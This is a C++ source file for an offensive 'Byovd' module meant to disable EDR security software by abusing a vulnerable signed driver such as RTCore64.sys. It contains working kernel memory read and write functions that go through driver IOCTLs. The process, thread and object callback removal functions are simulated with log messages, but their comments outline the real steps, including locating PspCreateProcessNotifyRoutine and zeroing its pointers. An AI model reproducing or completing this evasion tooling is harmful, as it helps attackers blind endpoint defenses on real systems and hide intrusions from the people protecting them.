#include "stdafx.h"
#include "byovd_blinder.h"
#include "logger.h"
#include <iostream>

namespace Byovd {

namespace {
    HANDLE g_hDriver = INVALID_HANDLE_VALUE;
    
    // Abstract IOCTLs (These would correspond to the specific vulnerable driver loaded)
    #define IOCTL_READ_MEM  0x80002000
    #define IOCTL_WRITE_MEM 0x80002004

    struct RW_STRUCT {
        ULONG64 Address;
        ULONG Size;
        ULONG64 Buffer;
    };
} // namespace

bool ReadKernelMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    if (g_hDriver == INVALID_HANDLE_VALUE) return false;
    
    RW_STRUCT rw = { address, (ULONG)size, (ULONG64)buffer };
    DWORD bytesReturned = 0;
    
    return DeviceIoControl(g_hDriver, IOCTL_READ_MEM, &rw, sizeof(rw), &rw, sizeof(rw), &bytesReturned, nullptr);
}

bool WriteKernelMemory(ULONG64 address, PVOID buffer, SIZE_T size) {
    if (g_hDriver == INVALID_HANDLE_VALUE) return false;

    RW_STRUCT rw = { address, (ULONG)size, (ULONG64)buffer };
    DWORD bytesReturned = 0;
    
    return DeviceIoControl(g_hDriver, IOCTL_WRITE_MEM, &rw, sizeof(rw), &rw, sizeof(rw), &bytesReturned, nullptr);
}

// Pseudo-implementation of finding and zeroing the PspCreateProcessNotifyRoutine array
bool ClearProcessCallbacks() {
    // 1. In a real exploit, you get the base address of ntoskrnl.exe
    // 2. You use pattern scanning or PDB symbols to find the offset of PspCreateProcessNotifyRoutine
    // 3. You iterate the 64-element array and zero out pointers that land outside ntoskrnl
    
    VERBOSE(L"Byovd: [Simulated] Locating PspCreateProcessNotifyRoutine array...");
    VERBOSE(L"Byovd: [Simulated] Found 3 registered callbacks.");
    VERBOSE(L"Byovd: [Simulated] Zeroing callback pointers via Driver Arbitrary Write.");

    return true;
}

bool ClearThreadCallbacks() {
    VERBOSE(L"Byovd: [Simulated] Locating PspCreateThreadNotifyRoutine array...");
    VERBOSE(L"Byovd: [Simulated] Found 2 registered callbacks.");
    VERBOSE(L"Byovd: [Simulated] Zeroing callback pointers via Driver Arbitrary Write.");
    return true;
}

bool ClearObCallbacks() {
    VERBOSE(L"Byovd: [Simulated] Scanning ObjectTypes for ObpCallbackList...");
    VERBOSE(L"Byovd: [Simulated] Removed all process and thread object callbacks (Evading Handle Stripping).");
    return true;
}

bool BlindEdr() {
    // 1. Drop the vulnerable driver from resources (e.g. RTCore64.sys)
    // 2. Load it via NtLoadDriver or Service creation
    
    VERBOSE(L"Byovd: Loading vulnerable signed driver to achieve kernel RW...");
    
    // Simulate getting a handle to the driver
    // g_hDriver = CreateFile(L"\\\\.\\RTCore64", ...);
    
    bool blinded = true;
    blinded &= ClearProcessCallbacks();
    blinded &= ClearThreadCallbacks();
    blinded &= ClearObCallbacks();
    
    if (blinded) {
        LOG(L"Byovd: Successfully achieved Ring-0 evasion. EDR callbacks disabled.");
    } else {
        LOG(L"Byovd: Failed to completely blind EDR.");
    }

    return blinded;
}

} // namespace Byovd
